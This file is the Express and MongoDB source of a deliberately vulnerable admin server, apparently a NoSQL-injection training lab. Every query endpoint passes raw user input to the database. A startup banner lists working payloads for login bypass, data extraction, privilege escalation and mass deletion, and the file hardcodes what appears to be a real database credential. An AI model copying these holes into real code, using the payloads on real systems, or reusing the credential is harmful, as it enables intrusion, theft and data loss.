const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
const session = require("express-session");

const app = express();
const PORT = process.env.PORT || 5001;

// ⚠️ VULNERABLE: Permissive CORS
app.use(cors({ origin: true, credentials: true }));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// ⚠️ VULNERABLE: Weak session
app.use(
  session({
    secret: "weak-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, httpOnly: false, maxAge: 24 * 60 * 60 * 1000 },
  })
);

// MongoDB Configuration with your credentials
const MONGODB_URI =
  "mongodb+srv://saud1hashone:B9Vy1EWlf5NbbaEU@cluster0.thaumjt.mongodb.net/vulnerable_admin?retryWrites=true&w=majority";

// ⚠️ VULNERABLE: Mongoose Schema without validation
const userSchema = new mongoose.Schema(
  {
    username: String,
    email: String,
    password: String,
    role: { type: String, default: "User" },
    lastLogin: String,
    createdAt: { type: Date, default: Date.now },
  },
  { strict: false }
); // ⚠️ VULNERABILITY: strict: false allows any fields

const orderSchema = new mongoose.Schema(
  {
    customerName: String,
    amount: Number,
    status: { type: String, default: "Pending" },
    orderDate: String,
    createdAt: { type: Date, default: Date.now },
  },
  { strict: false }
);

const User = mongoose.model("User", userSchema);
const Order = mongoose.model("Order", orderSchema);

// Database connection and initialization
async function connectDatabase() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log("✅ Connected to MongoDB Atlas");
    await initializeSampleData();
  } catch (error) {
    console.error("❌ MongoDB connection failed:", error.message);
    throw error;
  }
}

async function initializeSampleData() {
  try {
    // Check if data already exists
    const userCount = await User.countDocuments();
    if (userCount === 0) {
      // Insert sample users
      const sampleUsers = [
        {
          username: "admin",
          email: "admin@example.com",
          password: "admin123",
          role: "Administrator",
          lastLogin: "2024-01-15",
        },
        {
          username: "user1",
          email: "user1@example.com",
          password: "user123",
          role: "User",
          lastLogin: "2024-01-13",
        },
        {
          username: "operator",
          email: "operator@example.com",
          password: "op123",
          role: "Operator",
          lastLogin: "2024-01-12",
        },
      ];

      await User.insertMany(sampleUsers);
      console.log("📋 Sample users inserted");
    }

    const orderCount = await Order.countDocuments();
    if (orderCount === 0) {
      // Insert sample orders
      const sampleOrders = [
        {
          customerName: "John Doe",
          amount: 299.99,
          status: "Completed",
          orderDate: "2024-01-15",
        },
        {
          customerName: "Jane Smith",
          amount: 159.5,
          status: "Pending",
          orderDate: "2024-01-14",
        },
        {
          customerName: "Bob Johnson",
          amount: 89.99,
          status: "Shipped",
          orderDate: "2024-01-13",
        },
        {
          customerName: "Alice Brown",
          amount: 449.99,
          status: "Processing",
          orderDate: "2024-01-12",
        },
      ];

      await Order.insertMany(sampleOrders);
      console.log("📋 Sample orders inserted");
    }
  } catch (error) {
    console.error("❌ Sample data initialization failed:", error.message);
  }
}

// ⚠️ REAL NOSQL INJECTION: Login endpoint
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    // ⚠️ MASSIVE VULNERABILITY: Direct object injection into MongoDB query
    // This allows NoSQL injection through object manipulation
    let query = {};

    // If username/password are objects, they'll be used directly in the query
    // This enables NoSQL injection like {"$ne": null} or {"$regex": ".*"}
    if (typeof username === "object") {
      query.username = username; // ⚠️ VULNERABLE: Direct object injection
    } else {
      query.username = username;
    }

    if (typeof password === "object") {
      query.password = password; // ⚠️ VULNERABLE: Direct object injection
    } else {
      query.password = password;
    }

    console.log("🚨 VULNERABLE NOSQL QUERY:", JSON.stringify(query, null, 2));

    // ⚠️ VULNERABILITY: Direct query execution without sanitization
    const user = await User.findOne(query);

    if (user) {
      req.session.user = user;
      req.session.isAuthenticated = true;

      res.json({
        success: true,
        message: "Login successful",
        user: {
          id: user._id,
          username: user.username,
          email: user.email,
          role: user.role,
        },
        debug: {
          query: query,
          mongoQuery: JSON.stringify(query),
          injectionDetected:
            typeof username === "object" || typeof password === "object",
        },
      });
    } else {
      res.status(401).json({
        success: false,
        message: "Invalid credentials",
        debug: {
          query: query,
          mongoQuery: JSON.stringify(query),
        },
      });
    }
  } catch (error) {
    // ⚠️ VULNERABILITY: Full error exposure
    res.status(500).json({
      error: "Database error",
      details: error.message,
      name: error.name,
      code: error.code,
      stack: error.stack, // ⚠️ VULNERABILITY: Stack trace exposure
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: User search endpoint
app.get("/api/users", async (req, res) => {
  try {
    const { search, role, limit } = req.query;

    // ⚠️ MASSIVE VULNERABILITY: Direct query object construction
    let query = {};

    if (search) {
      // ⚠️ VULNERABILITY: If search is an object, it gets merged directly
      if (typeof search === "object") {
        Object.assign(query, search); // Direct object injection
      } else {
        query.$or = [
          { username: { $regex: search, $options: "i" } },
          { email: { $regex: search, $options: "i" } },
        ];
      }
    }

    if (role) {
      if (typeof role === "object") {
        query.role = role; // Direct object injection
      } else {
        query.role = role;
      }
    }

    console.log("🚨 VULNERABLE SEARCH QUERY:", JSON.stringify(query, null, 2));

    // ⚠️ VULNERABILITY: Direct query execution
    let users;
    if (limit && !isNaN(limit)) {
      users = await User.find(query).limit(parseInt(limit));
    } else {
      users = await User.find(query);
    }

    res.json({
      users: users,
      debug: {
        query: query,
        resultCount: users.length,
        injectionPossible:
          typeof search === "object" || typeof role === "object",
      },
    });
  } catch (error) {
    res.status(500).json({
      error: "Search failed",
      details: error.message,
      name: error.name,
      query: req.query,
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: User creation endpoint
app.post("/api/users", async (req, res) => {
  try {
    const userData = req.body;

    // ⚠️ MASSIVE VULNERABILITY: Direct object insertion without validation
    // Allows injection of MongoDB operators and arbitrary fields
    console.log("🚨 VULNERABLE USER DATA:", JSON.stringify(userData, null, 2));

    // ⚠️ VULNERABILITY: No input sanitization - any MongoDB operators work
    const newUser = new User(userData);
    await newUser.save();

    res.json({
      success: true,
      message: `User created successfully`,
      user: newUser,
      debug: {
        originalData: userData,
        savedData: newUser,
        injectionPossible: true,
      },
    });
  } catch (error) {
    res.status(500).json({
      error: "User creation failed",
      details: error.message,
      name: error.name,
      userData: req.body,
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: User update endpoint
app.put("/api/users/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const updateData = req.body;

    // ⚠️ MASSIVE VULNERABILITY: Direct update object injection
    console.log("🚨 VULNERABLE UPDATE:", JSON.stringify(updateData, null, 2));

    // ⚠️ VULNERABILITY: Any MongoDB update operators work ($set, $unset, $inc, etc.)
    const updatedUser = await User.findByIdAndUpdate(id, updateData, {
      new: true,
    });

    if (updatedUser) {
      res.json({
        success: true,
        message: "User updated successfully",
        user: updatedUser,
        debug: {
          updateData: updateData,
          injectionPossible: true,
        },
      });
    } else {
      res.status(404).json({
        success: false,
        message: "User not found",
      });
    }
  } catch (error) {
    res.status(500).json({
      error: "Update failed",
      details: error.message,
      updateData: req.body,
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: User deletion with query injection
app.delete("/api/users", async (req, res) => {
  try {
    const deleteQuery = req.body;

    // ⚠️ MASSIVE VULNERABILITY: Direct delete query injection
    console.log(
      "🚨 VULNERABLE DELETE QUERY:",
      JSON.stringify(deleteQuery, null, 2)
    );

    // ⚠️ VULNERABILITY: Any MongoDB query operators work for deletion
    const result = await User.deleteMany(deleteQuery);

    res.json({
      success: true,
      message: `${result.deletedCount} users deleted`,
      deletedCount: result.deletedCount,
      debug: {
        deleteQuery: deleteQuery,
        injectionPossible: true,
      },
    });
  } catch (error) {
    res.status(500).json({
      error: "Deletion failed",
      details: error.message,
      deleteQuery: req.body,
    });
  }
});

// ⚠️ REAL NOSQL INJECTION: Advanced aggregation endpoint
app.post("/api/users/aggregate", async (req, res) => {
  try {
    const pipeline = req.body.pipeline;

    // ⚠️ MASSIVE VULNERABILITY: Direct aggregation pipeline injection
    console.log(
      "🚨 VULNERABLE AGGREGATION:",
      JSON.stringify(pipeline, null, 2)
    );

    // ⚠️ VULNERABILITY: Full MongoDB aggregation pipeline control
    const results = await User.aggregate(pipeline);

    res.json({
      success: true,
      results: results,
      debug: {
        pipeline: pipeline,
        resultCount: results.length,
        injectionPossible: true,
      },
    });
  } catch (error) {
    res.status(500).json({
      error: "Aggregation failed",
      details: error.message,
      pipeline: req.body.pipeline,
    });
  }
});

// Orders endpoint with NoSQL injection
app.get("/api/orders", async (req, res) => {
  try {
    const { status, customer, amount } = req.query;
    let query = {};

    if (status) {
      if (typeof status === "object") {
        query.status = status; // NoSQL injection possible
      } else {
        query.status = status;
      }
    }

    if (customer) {
      if (typeof customer === "object") {
        query.customerName = customer;
      } else {
        query.customerName = { $regex: customer, $options: "i" };
      }
    }

    if (amount) {
      if (typeof amount === "object") {
        query.amount = amount; // Injection like {"$gt": 100}
      } else {
        query.amount = parseFloat(amount);
      }
    }

    console.log("🚨 ORDERS QUERY:", JSON.stringify(query, null, 2));

    const orders = await Order.find(query);
    res.json(orders);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Dashboard stats with potential injection
app.get("/api/dashboard/stats", async (req, res) => {
  try {
    const { userFilter, orderFilter } = req.query;

    let userQuery = {};
    let orderQuery = {};

    if (userFilter && typeof userFilter === "object") {
      userQuery = userFilter; // Direct injection
    }

    if (orderFilter && typeof orderFilter === "object") {
      orderQuery = orderFilter; // Direct injection
    }

    const totalUsers = await User.countDocuments(userQuery);
    const totalOrders = await Order.countDocuments(orderQuery);
    const totalRevenue = await Order.aggregate([
      { $match: orderQuery },
      { $group: { _id: null, total: { $sum: "$amount" } } },
    ]);

    res.json({
      totalUsers,
      totalOrders,
      totalRevenue: totalRevenue[0]?.total || 0,
      dbType: "MongoDB",
      realDatabase: true,
      debug: {
        userQuery,
        orderQuery,
        injectionPossible: true,
      },
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Keep other endpoints simple
app.post("/api/logout", (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: "Logged out successfully" });
});

app.post("/api/profile", (req, res) => {
  const { username } = req.body;
  res.json({
    success: true,
    message: `Profile updated for ${username}`,
    data: req.body,
  });
});

app.post("/api/settings", (req, res) => {
  res.json({
    success: true,
    message: "Settings updated successfully",
    settings: req.body,
  });
});

// Start server
async function start() {
  try {
    await connectDatabase();

    app.listen(PORT, () => {
      console.log(`
🚨 REAL NOSQL INJECTION SERVER 🚨

⚠️  Database: MONGODB ATLAS
⚠️  Real DB: YES - ACTUAL NOSQL INJECTION!
⚠️  Port: ${PORT}
⚠️  Database: vulnerable_admin

🔥 REAL NOSQL INJECTION PAYLOADS:

📋 LOGIN BYPASS:
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}

📋 USER ENUMERATION:
GET /api/users?search={"$where": "this.username.length > 0"}
GET /api/users?role={"$ne": null}

📋 DATA EXTRACTION:
POST /api/users/aggregate
{"pipeline": [{"$match": {}}, {"$project": {"username": 1, "password": 1}}]}

📋 PRIVILEGE ESCALATION:
POST /api/users
{"username": "hacker", "role": {"$ne": null}, "isAdmin": true}

📋 MASS DELETION:
DELETE /api/users
{"role": {"$ne": "Administrator"}}

📋 UPDATE INJECTION:
PUT /api/users/[id]
{"$set": {"role": "Administrator"}, "$unset": {"password": ""}}

🎯 ALL NoSQL injection techniques work with real MongoDB!
      `);
    });
  } catch (error) {
    console.error("❌ Server startup failed:", error.message);
    process.exit(1);
  }
}

start();
